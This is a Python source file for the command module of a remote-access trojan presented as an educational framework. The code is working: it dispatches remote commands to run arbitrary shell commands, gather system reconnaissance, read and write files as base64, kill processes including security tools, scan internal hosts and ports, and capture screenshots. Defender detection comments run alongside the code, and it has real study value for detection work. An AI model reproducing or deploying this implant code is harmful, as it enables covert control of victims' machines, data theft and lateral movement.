"""
============================================================================
 教育用途远程管理框架 - 命令执行模块
 Educational Remote Administration Framework - Command Execution Module
============================================================================

 学习目标：
 1. 理解 C2 命令分发架构
 2. 了解常见的远控命令类型
 3. 学习安全的命令执行模式
 4. 理解防御方可以监控的 API 调用

 防守方检测点（学习如何检测这些操作）：
 - CreateProcess / cmd.exe 调用 → 进程监控
 - 文件读写操作 → 文件系统监控 (Sysmon Event 11)
 - 注册表操作 → Sysmon Event 12/13
 - 网络连接 → Netflow / Sysmon Event 3
 - 计划任务创建 → Event ID 4698
"""

import os
import re
import sys
import json
import time
import shutil
import socket
import base64
import ctypes
import hashlib
import logging
import pathlib
import platform
import subprocess
import traceback
from abc import ABC, abstractmethod
from typing import Dict, Any, Optional, List, Tuple

logger = logging.getLogger(__name__)


# ============================================================================
# 命令结果 / Command Result
# ============================================================================

class CommandResult:
    """命令执行结果"""

    __slots__ = ('command_id', 'success', 'output', 'error', 'duration_ms')

    def __init__(self, command_id: str, success: bool = True,
                 output: str = "", error: str = "", duration_ms: float = 0):
        self.command_id = command_id
        self.success = success
        self.output = output
        self.error = error
        self.duration_ms = duration_ms

    def to_json(self) -> bytes:
        return json.dumps({
            "command_id": self.command_id,
            "success": self.success,
            "output": self.output,
            "error": self.error,
            "duration_ms": self.duration_ms,
        }, ensure_ascii=False).encode('utf-8')

    @classmethod
    def from_json(cls, data: bytes) -> 'CommandResult':
        d = json.loads(data.decode('utf-8'))
        return cls(
            command_id=d["command_id"],
            success=d["success"],
            output=d.get("output", ""),
            error=d.get("error", ""),
            duration_ms=d.get("duration_ms", 0),
        )


# ============================================================================
# 命令基类 / Command Base
# ============================================================================

class Command(ABC):
    """命令抽象基类"""

    def __init__(self, cmd_id: str):
        self.cmd_id = cmd_id

    @abstractmethod
    def execute(self, args: Dict[str, Any]) -> CommandResult:
        """执行命令并返回结果"""
        pass

    @staticmethod
    @abstractmethod
    def name() -> str:
        """命令名称"""
        pass

    @staticmethod
    @abstractmethod
    def description() -> str:
        """命令描述"""
        pass


# ============================================================================
# 系统命令执行 / Shell Command
# ============================================================================

class ShellCommand(Command):
    """
    Shell 命令执行

    攻击方视角：最常用的远控功能
    防守方检测：
    - 监控 cmd.exe / powershell.exe / bash 的不正常启动
    - Sysmon Event 1 (Process Creation)
    - 命令行参数分析（检测异常命令模式）
    - EDR 行为检测：脚本解释器由非交互进程启动
    """

    @staticmethod
    def name() -> str:
        return "shell"

    @staticmethod
    def description() -> str:
        return "Execute shell command on target system"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        cmd = args.get("command", "")
        if not cmd:
            return CommandResult(self.cmd_id, False, error="No command provided")

        timeout = args.get("timeout", 30)
        shell_name = "cmd.exe" if sys.platform == "win32" else "/bin/bash"

        try:
            start = time.time()

            # 教育要点：使用 subprocess 的防御性参数
            # 攻击者经常使用 shell=True 来支持管道/重定向
            process = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=timeout,
                text=True,
                encoding='utf-8',
                errors='replace',
                # 防守方注意：攻击者可能通过环境变量隐藏恶意行为
            )

            duration = (time.time() - start) * 1000
            output = process.stdout
            if process.stderr:
                output += "\n[STDERR]\n" + process.stderr

            # 截断过长输出（防 DoS）
            max_output = 65536  # 64KB
            if len(output) > max_output:
                output = output[:max_output] + f"\n... [truncated {len(output) - max_output} bytes]"

            return CommandResult(
                command_id=self.cmd_id,
                success=(process.returncode == 0),
                output=output,
                duration_ms=duration,
            )

        except subprocess.TimeoutExpired:
            return CommandResult(
                self.cmd_id, False,
                error=f"Command timed out after {timeout}s"
            )
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


# ============================================================================
# 系统信息收集 / System Information Gathering
# ============================================================================

class SystemInfoCommand(Command):
    """
    系统信息收集

    攻击方视角：侦查阶段，收集目标环境信息
    防守方检测：
    - 大量系统 API 调用（WMI, /proc 读取）
    - 异常进程枚举行为
    - 注册表读取（查看已安装软件）
    """

    @staticmethod
    def name() -> str:
        return "sysinfo"

    @staticmethod
    def description() -> str:
        return "Collect system information from target"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        try:
            info = {}

            # 基础信息
            info["hostname"] = socket.gethostname()
            info["platform"] = platform.platform()
            info["architecture"] = platform.machine()
            info["processor"] = platform.processor()
            info["python_version"] = sys.version
            info["current_user"] = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))

            # 操作系统信息
            if sys.platform == "win32":
                info["os_version"] = f"Windows {platform.release()} ({platform.version()})"
                info["is_admin"] = self._check_windows_admin()
            else:
                try:
                    info["os_version"] = platform.freedesktop_os_release().get("PRETTY_NAME", "Linux")
                except Exception:
                    info["os_version"] = f"Linux {platform.release()}"
                info["is_admin"] = (os.geteuid() == 0)

            # 工作目录
            info["current_directory"] = os.getcwd()

            # 网络信息
            try:
                info["ip_address"] = socket.gethostbyname(socket.gethostname())
            except Exception:
                info["ip_address"] = "unknown"

            # 环境变量（敏感信息，截断处理）
            sensitive_env_keys = ["PATH", "HOME", "USER", "SHELL", "LANG", "TEMP", "TMP"]
            info["environment"] = {
                k: os.environ.get(k, "")
                for k in sensitive_env_keys if k in os.environ
            }

            return CommandResult(
                command_id=self.cmd_id,
                success=True,
                output=json.dumps(info, indent=2, ensure_ascii=False),
            )

        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))

    @staticmethod
    def _check_windows_admin() -> bool:
        """检查 Windows 管理员权限"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False


# ============================================================================
# 文件操作 / File Operations
# ============================================================================

class FileListCommand(Command):
    """
    文件列表

    防守方检测：Sysmon Event 11 (FileCreate) + 大量文件枚举
    """

    @staticmethod
    def name() -> str:
        return "ls"

    @staticmethod
    def description() -> str:
        return "List files in a directory"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        path = args.get("path", os.getcwd())

        try:
            entries = []
            with os.scandir(path) as it:
                for entry in it:
                    try:
                        stat = entry.stat()
                        entry_type = "D" if entry.is_dir() else "F"
                        size = stat.st_size if entry.is_file() else 0
                        mtime = time.strftime("%Y-%m-%d %H:%M:%S",
                                              time.localtime(stat.st_mtime))
                        entries.append({
                            "type": entry_type,
                            "name": entry.name,
                            "size": size,
                            "modified": mtime,
                        })
                    except (PermissionError, OSError):
                        entries.append({
                            "type": "?",
                            "name": entry.name,
                            "size": 0,
                            "modified": "N/A (permission denied)",
                        })

            entries.sort(key=lambda e: (e["type"], e["name"].lower()))

            output = json.dumps({
                "path": path,
                "count": len(entries),
                "entries": entries,
            }, indent=2, ensure_ascii=False)

            return CommandResult(self.cmd_id, True, output=output)
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


class FileReadCommand(Command):
    """
    文件读取

    防守方检测：
    - 异常文件访问模式（读取非工作相关文件）
    - 敏感文件访问监控（/etc/shadow, SAM, NTDS.dit）
    """

    @staticmethod
    def name() -> str:
        return "cat"

    @staticmethod
    def description() -> str:
        return "Read file contents"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        path = args.get("path", "")

        # 安全检查：拒绝读取过大文件
        max_size = args.get("max_size", 1048576)  # 1MB default
        if not path:
            return CommandResult(self.cmd_id, False, error="No file path provided")

        try:
            file_size = os.path.getsize(path)
            if file_size > max_size:
                return CommandResult(
                    self.cmd_id, False,
                    error=f"File too large: {file_size} > {max_size} bytes"
                )

            with open(path, 'rb') as f:
                content = f.read()

            # Base64 编码以安全传输二进制文件
            encoded = base64.b64encode(content).decode('ascii')

            return CommandResult(
                self.cmd_id, True,
                output=json.dumps({
                    "path": path,
                    "size": file_size,
                    "encoding": "base64",
                    "content": encoded,
                })
            )

        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


class FileWriteCommand(Command):
    """
    文件写入

    防守方检测：
    - 异常文件写入位置（Temp, Startup, System32）
    - Sysmon Event 11 (FileCreate)
    - EDR：非可信进程创建可执行文件
    """

    @staticmethod
    def name() -> str:
        return "write"

    @staticmethod
    def description() -> str:
        return "Write content to a file"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        path = args.get("path", "")
        content_b64 = args.get("content", "")

        if not path:
            return CommandResult(self.cmd_id, False, error="No path provided")

        try:
            content = base64.b64decode(content_b64)
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)

            with open(path, 'wb') as f:
                f.write(content)

            return CommandResult(
                self.cmd_id, True,
                output=f"Written {len(content)} bytes to {path}"
            )
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


# ============================================================================
# 进程管理 / Process Management
# ============================================================================

class ProcessListCommand(Command):
    """
    进程列表

    防守方检测：
    - 大量进程枚举可能是侦察活动
    - 攻击者常搜索 AV/EDR 进程名称
    """

    @staticmethod
    def name() -> str:
        return "ps"

    @staticmethod
    def description() -> str:
        return "List running processes"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        try:
            import psutil

            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
                try:
                    info = proc.info
                    processes.append({
                        "pid": info["pid"],
                        "name": info["name"],
                        "cpu": round(info["cpu_percent"] or 0, 1),
                        "memory_mb": round(
                            (info["memory_info"].rss if info["memory_info"] else 0)
                            / (1024 * 1024), 1
                        ),
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            processes.sort(key=lambda p: p["cpu"], reverse=True)

            output = json.dumps({
                "count": len(processes),
                "processes": processes[:50],  # Top 50 by CPU
            }, indent=2)

            return CommandResult(self.cmd_id, True, output=output)
        except ImportError:
            return CommandResult(
                self.cmd_id, False,
                error="psutil not installed. Install: pip install psutil"
            )
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


class ProcessKillCommand(Command):
    """
    终止进程

    防守方检测：
    - 终止安全软件进程是恶意行为的强特征
    - Windows Event ID 4689 (Process Termination)
    """

    @staticmethod
    def name() -> str:
        return "kill"

    @staticmethod
    def description() -> str:
        return "Terminate a process by PID or name"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        pid = args.get("pid")
        name = args.get("name")

        try:
            import psutil
            killed = []

            if pid:
                proc = psutil.Process(pid)
                proc_name = proc.name()
                proc.terminate()
                killed.append(f"PID {pid} ({proc_name})")

            elif name:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info["name"].lower() == name.lower():
                        try:
                            proc.terminate()
                            killed.append(f"PID {proc.info['pid']}")
                        except Exception:
                            pass

            if not killed:
                return CommandResult(self.cmd_id, False, error="No matching process found")

            return CommandResult(self.cmd_id, True, output=f"Terminated: {', '.join(killed)}")

        except ImportError:
            return CommandResult(
                self.cmd_id, False,
                error="psutil not installed"
            )
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))


# ============================================================================
# 网络命令 / Network Commands
# ============================================================================

class NetworkScanCommand(Command):
    """
    网络扫描 —— 内网横向移动侦察

    攻击方视角：侦察内网拓扑和其他主机
    防守方检测：
    - 突发大量 ICMP/TCP SYN 包
    - ARP 扫描检测
    - 异常端口扫描行为
    """

    @staticmethod
    def name() -> str:
        return "netscan"

    @staticmethod
    def description() -> str:
        return "Scan local network for active hosts"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        subnet = args.get("subnet", "")
        ports = args.get("ports", [22, 80, 443, 445, 3389, 8080, 8443])

        if not subnet:
            # Auto-detect local subnet
            subnet = self._detect_subnet()

        try:
            results = []
            # Parse subnet (e.g., "192.168.1.0/24")
            base_ip, cidr = subnet.rsplit("/", 1)
            cidr = int(cidr)

            # Calculate host range
            import ipaddress
            network = ipaddress.IPv4Network(subnet, strict=False)

            # 教育用途：限制扫描范围和速度
            hosts = list(network.hosts())[:20]  # Max 20 hosts

            for ip in hosts:
                ip_str = str(ip)
                if self._is_alive(ip_str):
                    open_ports = self._scan_ports(ip_str, ports)
                    results.append({
                        "ip": ip_str,
                        "alive": True,
                        "open_ports": open_ports,
                    })

            return CommandResult(
                self.cmd_id, True,
                output=json.dumps({
                    "subnet": subnet,
                    "scanned": len(hosts),
                    "alive": len(results),
                    "hosts": results,
                }, indent=2)
            )

        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))

    def _detect_subnet(self) -> str:
        """自动检测本地子网"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            parts = ip.split(".")
            # 假设 /24 子网
            return f"{'.'.join(parts[:3])}.0/24"
        except Exception:
            return "192.168.1.0/24"

    def _is_alive(self, ip: str, timeout: float = 0.5) -> bool:
        """ICMP ping (需要 root 权限, 否则用 TCP)"""
        # TCP port 445 (SMB) 常用于主机发现
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 445))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _scan_ports(self, ip: str, ports: List[int], timeout: float = 0.5) -> List[int]:
        """TCP 端口扫描"""
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except Exception:
                pass
        return open_ports


# ============================================================================
# 截图命令（教育用途）/ Screenshot
# ============================================================================

class ScreenshotCommand(Command):
    """
    屏幕截图

    攻击方视角：获取目标桌面可视信息
    防守方检测：
    - 异常的 GDI / X11 / Wayland API 调用
    - 使用 DPI 感知检测
    """

    @staticmethod
    def name() -> str:
        return "screenshot"

    @staticmethod
    def description() -> str:
        return "Capture screenshot of target desktop"

    def execute(self, args: Dict[str, Any]) -> CommandResult:
        try:
            if sys.platform == "win32":
                return self._screenshot_windows(args)
            else:
                return self._screenshot_linux(args)
        except ImportError as e:
            return CommandResult(
                self.cmd_id, False,
                error=f"Required library not available: {e}. "
                      "Install: pip install pillow mss"
            )
        except Exception as e:
            return CommandResult(self.cmd_id, False, error=str(e))

    def _screenshot_windows(self, args: Dict[str, Any]) -> CommandResult:
        """Windows 截图（使用 PIL/Pillow）"""
        from PIL import ImageGrab
        import io

        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.save(buf, format="PNG", optimize=True)
        img_data = base64.b64encode(buf.getvalue()).decode('ascii')

        return CommandResult(
            self.cmd_id, True,
            output=json.dumps({
                "format": "PNG",
                "size": len(buf.getvalue()),
                "encoding": "base64",
                "data": img_data[:100] + "...",  # 截断用于演示
            })
        )

    def _screenshot_linux(self, args: Dict[str, Any]) -> CommandResult:
        """Linux 截图（使用 mss）"""
        import mss
        import io
        from PIL import Image

        with mss.mss() as sct:
            monitor = sct.monitors[0]  # All monitors
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            img_data = base64.b64encode(buf.getvalue()).decode('ascii')

        return CommandResult(
            self.cmd_id, True,
            output=json.dumps({
                "format": "PNG",
                "size": len(buf.getvalue()),
                "encoding": "base64",
                "data": img_data[:100] + "...",
            })
        )


# ============================================================================
# 命令分发器 / Command Dispatcher
# ============================================================================

class CommandDispatcher:
    """
    命令分发器 —— 将命令名称路由到对应的处理器

    教育要点：
    - 插件式架构，方便扩展新命令
    - 命令白名单（防守方可以审计支持的命令）
    """

    def __init__(self):
        self._commands: Dict[str, Command] = {}
        self._register_defaults()

    def _register_defaults(self):
        """注册默认命令"""
        defaults = [
            ShellCommand,
            SystemInfoCommand,
            FileListCommand,
            FileReadCommand,
            FileWriteCommand,
            ProcessListCommand,
            ProcessKillCommand,
            NetworkScanCommand,
            ScreenshotCommand,
        ]
        for cmd_cls in defaults:
            self.register(cmd_cls)

    def register(self, cmd_cls: type):
        """注册新命令类型"""
        name = cmd_cls.name()
        self._commands[name] = cmd_cls
        logger.debug(f"Registered command: {name}")

    def execute(self, cmd_id: str, cmd_name: str,
                args: Dict[str, Any]) -> CommandResult:
        """执行命令"""
        cmd_cls = self._commands.get(cmd_name)
        if cmd_cls is None:
            return CommandResult(
                cmd_id, False,
                error=f"Unknown command: {cmd_name}. "
                      f"Available: {', '.join(self._commands.keys())}"
            )

        logger.info(f"[CMD] Executing: {cmd_name} (id={cmd_id})")
        start = time.time()
        result = cmd_cls(cmd_id).execute(args)
        elapsed = (time.time() - start) * 1000

        logger.info(
            f"[CMD] Result: {cmd_name} -> "
            f"{'OK' if result.success else 'FAIL'} ({elapsed:.0f}ms)"
        )
        return result

    def list_commands(self) -> Dict[str, str]:
        """列出所有可用命令"""
        return {name: cls.description() for name, cls in self._commands.items()}


# ============================================================================
# 自测 / Self-Test
# ============================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)

    print("=" * 60)
    print("命令模块自测 / Command Module Self-Test")
    print("=" * 60)

    dispatcher = CommandDispatcher()

    # 列出所有命令
    print("\n[1] 可用命令列表:")
    for name, desc in dispatcher.list_commands().items():
        print(f"    {name:15s} - {desc}")

    # 测试 sysinfo
    print("\n[2] 系统信息收集:")
    result = dispatcher.execute("test-001", "sysinfo", {})
    print(f"    成功: {result.success}")
    print(f"    输出: {result.output[:200]}...")

    # 测试 ls
    print("\n[3] 目录列表:")
    result = dispatcher.execute("test-002", "ls", {"path": "/tmp"})
    print(f"    成功: {result.success}")

    # 测试 shell
    print("\n[4] Shell 命令:")
    result = dispatcher.execute("test-003", "shell", {"command": "echo 'Hello from educational RAT!'"})
    print(f"    成功: {result.success}")
    print(f"    输出: {result.output.strip()}")

    print("\n" + "=" * 60)
    print("命令模块测试完成！")
    print("=" * 60)
